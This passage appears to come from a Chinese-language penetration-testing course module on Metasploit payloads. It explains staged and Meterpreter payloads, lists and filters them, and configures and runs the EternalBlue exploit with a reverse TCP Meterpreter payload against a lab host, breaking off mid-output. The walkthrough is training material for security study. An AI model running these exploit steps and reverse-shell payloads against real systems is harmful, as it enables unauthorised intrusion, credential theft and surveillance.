shellcode，其唯一目的是初始化与攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会遇到这些通用名称<code>reverse_tcp</code>、<code>reverse_https</code>和<code>bind_tcp</code>。例如，在<code>show payloads</code>命令下，您可以查找如下所示的有效负载：</p><h4 id="MSF-分阶段有效载荷"><a href="#MSF-分阶段有效载荷" class="headerlink" title="MSF - 分阶段有效载荷"></a>MSF - 分阶段有效载荷</h4><p> MSF - 分阶段有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>​反向连接不太可能触发预防系统，例如初始化连接的是受害者主机，该主机大部分时间驻留在所谓的<code>security trust zone</code>. 然而，当然，网络的安全设备和人员不会盲目地遵循这种信任策略，因此即使是在这一步，攻击者也必须谨慎行事。</p><p>​Stage0 代码还旨在在到达后将更大的后续有效负载读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的有效载荷阶段，这应该授予他们 shell 访问权限。这个更大的有效载荷将是<code>Stage1</code>有效载荷。我们将在后面的部分中进行更详细的介绍。</p><h4 id="Meterpreter-载荷"><a href="#Meterpreter-载荷" class="headerlink" title="Meterpreter 载荷"></a>Meterpreter 载荷</h4><p>有效载荷<code>Meterpreter</code>是一种特定类型的多面有效载荷，用于<code>DLL injection</code>确保与受害主机的连接稳定，难以通过简单检查检测到，并在重启或系统更改后保持不变。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。此外，脚本和插件可以<code>loaded and unloaded</code>根据需要动态配置。</p><p>一旦执行了 Meterpreter 负载，就会创建一个新会话，它会生成 Meterpreter 接口。它与 msfconsole 界面非常相似，但所有可用的命令都是针对目标系统的，有效负载已“感染”该系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的部分中深入研究有关 Meterpreter 的更多细节。</p><p>使用 Meterpreter，我们还可以<code>load</code>在不同的 Plugins 中协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。</p><h2 id="搜索有效载荷"><a href="#搜索有效载荷" class="headerlink" title="搜索有效载荷"></a>搜索有效载荷</h2><p>​要选择我们的第一个有效载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要访问持久化，我们可能会想要选择一个 Meterpreter 负载。</p><p>如上所述，Meterpreter 有效负载为我们提供了极大的灵活性。它们的基本功能已经非常广泛且具有影响力。我们可以自动化并快速交付与渗透测试的<a href="https://github.com/gentilkiwi/mimikatz">GentilKiwi 的 Mimikatz 插件</a>等插件相结合的部分，同时保持有组织、高效的评估。要查看所有可用的有效负载，请使用<code>show payloads</code>中的命令<code>msfconsole</code>。</p><h4 id="MSF-列出有效载荷"><a href="#MSF-列出有效载荷" class="headerlink" title="MSF - 列出有效载荷"></a>MSF - 列出有效载荷</h4><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   #    Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">-    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd</span><br><span class="line">   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br><span class="line">   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager</span><br><span class="line">   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager</span><br><span class="line">   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager</span><br><span class="line">   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline</span><br><span class="line">   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline</span><br><span class="line">   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline</span><br><span class="line">   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager</span><br><span class="line">   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager</span><br><span class="line">   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager</span><br><span class="line">   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline</span><br><span class="line">   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">   </span><br><span class="line">   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager</span><br><span class="line">   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</span><br></pre></td></tr></table></figure><p>​如上所示，有很多可用的有效载荷可供选择。不仅如此，我们还可以使用创建我们的有效载荷<code>msfvenom</code>，但我们稍后会深入探讨。我们将使用与以前相同的目标，而不是使用默认的有效载荷，这是一个简单的<code>reverse_tcp_shell</code>，我们将使用一个<code>Meterpreter Payload for Windows 7(x64)</code>.</p><p>滚动上面的列表，我们找到包含<code>Meterpreter Payloads for Windows(x64)</code>.</p><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line">529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)</span><br><span class="line">530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)</span><br><span class="line">531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)</span><br><span class="line">532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)</span><br><span class="line">533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)</span><br><span class="line">534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64</span><br></pre></td></tr></table></figure><p>正如我们所见，在如此庞大的列表中找到所需的有效负载可能非常耗时。我们还可以使用<code>grep</code>in<code>msfconsole</code>来过滤掉特定的术语。这将加快搜索速度，从而加快我们的选择速度。</p><p>我们必须<code>grep</code>在开头输入带有相应参数的命令，然后输入要进行过滤的命令。例如，让我们假设我们希望为我们的漏洞利用处理一个<code>TCP</code>基础。因此，我们可以首先搜索有效负载中包含该词的所有结果。<code>reverse shell``Meterpreter``Meterpreter</code></p><h4 id="MSF-搜索特定有效载荷"><a href="#MSF-搜索特定有效载荷" class="headerlink" title="MSF - 搜索特定有效载荷"></a>MSF - 搜索特定有效载荷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads</span><br><span class="line"></span><br><span class="line">   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads</span><br><span class="line"></span><br><span class="line">[*] 14</span><br></pre></td></tr></table></figure><p>这给了我们一个总的<code>14</code>结果。现在我们可以在第一个命令之后添加另一个<code>grep</code>命令并搜索<code>reverse_tcp</code>.</p><p> MSF - 搜索特定有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">[*] 3</span><br></pre></td></tr></table></figure><p>在 的帮助下<code>grep</code>，我们将我们想要的有效载荷列表减少到更少。当然，该<code>grep</code>命令可用于所有其他命令。我们只需要知道我们在寻找什么。</p><h2 id="选择有效载荷"><a href="#选择有效载荷" class="headerlink" title="选择有效载荷"></a>选择有效载荷</h2><p>与模块一样，我们需要我们想要使用的条目的索引号。要为当前选定的模块设置有效负载，我们<code>set payload &lt;no.&gt;</code>仅在选择一个漏洞利用模块后才使用。</p><h4 id="MSF-选择负载"><a href="#MSF-选择负载" class="headerlink" title="MSF - 选择负载"></a>MSF - 选择负载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>选择有效载荷后，我们将有更多选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure><p>正如我们所见，通过<code>show payloads</code>在 Exploit 模块本身中运行命令，msfconsole 检测到目标是 Windows 机器，因此只显示针对 Windows 操作系统的有效负载。</p><p>我们还可以看到出现了一个新的选项字段，它与有效负载参数将包含的内容直接相关。我们将关注<code>LHOST</code>和<code>LPORT</code>（我们的攻击者 IP 和反向连接初始化所需的端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新发起攻击。</p><h2 id="使用负载"><a href="#使用负载" class="headerlink" title="使用负载"></a>使用负载</h2><p>是时候为 Exploit 模块和 payload 模块设置我们的参数了。对于利用部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>RHOSTS</code></td><td>远程主机的 IP 地址，目标机器。</td></tr><tr><td><code>RPORT</code></td><td>不需要更改，只需检查我们是否在运行 SMB 的端口 445 上。</td></tr></tbody></table><p>对于有效负载部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>LHOST</code></td><td>主机的IP地址，攻击者的机器。</td></tr><tr><td><code>LPORT</code></td><td>不需要更改，只需检查端口是否已被使用。</td></tr></tbody></table><p>如果我们想快速查看我们的 LHOST IP 地址，我们总是可以<code>ifconfig</code>直接从 msfconsole 菜单中调用该命令。</p><h4 id="MSF-利用和有效负载配置"><a href="#MSF-利用和有效负载配置" class="headerlink" title="MSF - 利用和有效负载配置"></a>MSF - 利用和有效负载配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(**windows/smb/ms17_010_eternalblue**) &gt; ifconfig</span><br><span class="line"></span><br><span class="line">**[\*]** exec: ifconfig</span><br><span class="line"></span><br><span class="line">tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br></pre></td></tr></table></figure><p>然后，我们可以运行漏洞并查看它返回的内容。查看以下输出中的差异：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span 